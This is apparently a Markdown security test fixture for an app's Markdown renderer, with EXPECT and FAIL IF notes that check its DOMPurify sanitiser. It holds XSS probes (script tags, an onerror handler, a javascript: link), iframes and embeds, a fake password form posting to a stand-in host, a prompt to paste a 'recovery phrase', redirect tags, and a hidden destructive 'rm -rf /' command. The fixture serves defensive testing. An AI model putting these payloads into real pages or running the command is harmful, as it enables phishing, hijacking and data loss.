# Inline HTML that must not survive rendering

CommonMark passes raw HTML through, and `EscapingHTMLFormatter` honours that
deliberately — see its `visitHTMLBlock` / `visitInlineHTML`. Nothing in the
Swift layer strips any of the markup below. DOMPurify, configured in
`MarkdownHTML+HostBridge.swift`, is the only thing standing between this
document and the reader.

`SanitizerNegativeTests` renders this file through the real pipeline and asserts
that none of it survives. If a merge weakens `SANITIZE_CONFIG`, drops the
DOMPurify bundle, or reintroduces a code path that writes to `innerHTML` without
sanitising, those tests fail.

**Reading this by eye:** each section below states what you should see. The
whole file passes when every EXPECT holds.

Two things to know before reading, or you will misjudge a pass:

1. **Sanitisation leaves no gap.** Most sections collapse to nothing, and an
   empty section is the passing result, not a rendering failure.
2. **Removing an element can leave its text behind.** DOMPurify defaults to
   `KEEP_CONTENT`, so a stripped `<button>Sign in</button>` leaves the words
   *Sign in* as ordinary paragraph text. That is a pass: the button is gone.
   **Judge the control, not the words.** What must never appear is something
   you can type into or click.

## Script execution

> **EXPECT:** one placeholder reading `x — file missing`, and nothing else.
> **FAIL IF:** anything appears that you can click or type into.
> **FAIL IF:** that placeholder offers a **Load** button. `x` is a reference
> inside this document's own folder, so nothing blocked it — it simply is not
> there, and a button would offer to retry what already failed.
>
> The placeholder is expected and is *not* a sanitiser failure. It comes from
> `<img src="x" onerror="…">`, the probe below: DOMPurify strips the **handler**
> and keeps the element, which is the correct outcome — the attack is the
> handler, not the image. F4 then labels a reference that cannot load instead
> of leaving a bare broken-image icon.
>
> Scripts cannot show themselves, so absence is the only visible evidence here
> — `SanitizerNegativeTests` is what proves they did not *run*.

<script>window.__pwned = true;</script>

<img src="x" onerror="window.__pwned = true;">

<svg><script>window.__pwned = true;</script></svg>

## Framed and embedded content

> **EXPECT:** nothing, or at most inert leftover text.
> **FAIL IF:** you see an inset panel, a bordered rectangle, a plugin
> placeholder, or a "cannot be displayed" message — any of those means the
> frame element survived and tried to load.

<iframe src="https://example.invalid/frame"></iframe>

<object data="https://example.invalid/object"></object>

<embed src="https://example.invalid/embed">

## Task list — must keep working

> **This is a positive control: you SHOULD see checkboxes.**
>
> **EXPECT:** two checkboxes below, one ticked, and **both clickable**.
> **FAIL IF:** they are missing. Form controls are stripped so a document
> cannot draw a credential prompt, and the rule that admits this one shape —
> a checkbox — is narrow enough to get wrong in the strict direction.
> **FAIL IF:** they are greyed out. The renderer emits `disabled`, DOMPurify
> strips it, and that removal is load-bearing: clicking a task checkbox is a
> real feature that writes the change back to the file.
>
> **Clicking one edits this fixture.** That is the feature working, not a
> fault — undo it with `git checkout tests/fixtures/security/inline-html.md`.

- [ ] unchecked task
- [x] checked task

## Credential harvesting

> **EXPECT:** no box you can click into and type in. A *Sign in* button may
> render and may depress when clicked — it does nothing, because there is no
> form behind it and no script can run.
> **FAIL IF:** you see a **text field** that takes a cursor, or typing into
> anything on this page produces characters. That is the whole test: if a
> document you merely opened can put a password field on screen, it can ask
> you for a password.
>
> Also FAIL IF you see a dropdown, a resizable multi-line box, or a
> checkbox that is not part of a task list — each of those is a control the
> sanitiser is supposed to remove.
>
> `<form>` and every input except task-list checkboxes are removed. `<button>`
> is deliberately **not** removed: the app emits its own buttons into this same
> article HTML (the Mermaid zoom controls, the code-copy control), so
> forbidding the tag deletes the app's own UI. Forbidding it is what broke the
> Mermaid controls in 1.0.4 and 1.0.5. A document-authored button is left inert
> rather than removed.
>
> Leftover text is expected: DOMPurify's `KEEP_CONTENT` default preserves the
> text inside a stripped element, so a removed control's label survives with
> nothing behind it.
>
> This section is why the automated test was not enough on its own: it
> asserted `<form>` count was zero, which was true while an input rendered
> anyway — the form was unwrapped and its children kept. It now counts the
> controls themselves.

<form action="https://example.invalid/collect" method="post">
  <input name="password" type="password">
  <button type="submit">Sign in</button>
</form>

Every other control the sanitiser removes, so that a change to the forbidden
list cannot pass unnoticed:

<label for="pw">Account password</label>
<select name="target"><option>Choose an account</option></select>
<textarea name="notes" rows="3">Paste your recovery phrase</textarea>
<fieldset><legend>Billing</legend><output name="total">0.00</output></fieldset>
<datalist id="suggestions"><option value="admin"></option></datalist>
<input type="text" name="username" list="suggestions">

## Document-level hijacking

> **EXPECT:** nothing between this note and the next heading, and the page
> stays put.
> **FAIL IF:** the preview navigates away, goes blank, or reloads by itself.
> These tags rewrite where the page's links point and can redirect the whole
> document to another site.

<base href="https://example.invalid/">

<meta http-equiv="refresh" content="0; url=https://example.invalid/">

<link rel="stylesheet" href="https://example.invalid/style.css">

## Scripted URLs

> **EXPECT:** the words *Looks like a link* appear, and **clicking them does
> nothing** — no navigation, no flicker, no new window.
> **FAIL IF:** clicking does something.
>
> Note the text may still be **styled** like a link, in link colour. That is
> not a failure: the sanitiser strips the `href` and leaves `<a>Looks like a
> link</a>` behind, and the stylesheet colours anchors whether or not they
> have an `href`. Colour is not the test; behaviour is. An earlier version of
> this note said to expect no colour, which reads a pass as a failure.

[Looks like a link](javascript:window.__pwned=true)

## Visual deception against the copy button

The `style` attribute is stripped specifically so a hidden segment cannot ride
along in `textContent` when a reader copies a code block.

> **This section inverts the others — here you SHOULD see something.**
>
> **EXPECT:** the text `rm -rf /` is **visible** directly below. It was
> authored as hidden; the sanitiser strips the `style` attribute, which
> unhides it. Seeing it is the pass.
> **FAIL IF:** it is missing. Invisible means `style="display:none"` survived,
> and text you cannot see could ride along into your clipboard when you copy
> a code block.
>
> **EXPECT:** the rest of this page is still visible.
> **FAIL IF:** the page is blank below here — that means the `<style>` block
> survived and applied `body { display: none }` to the whole document.

<span style="display:none">rm -rf /</span>

<style>body { display: none; }</style>
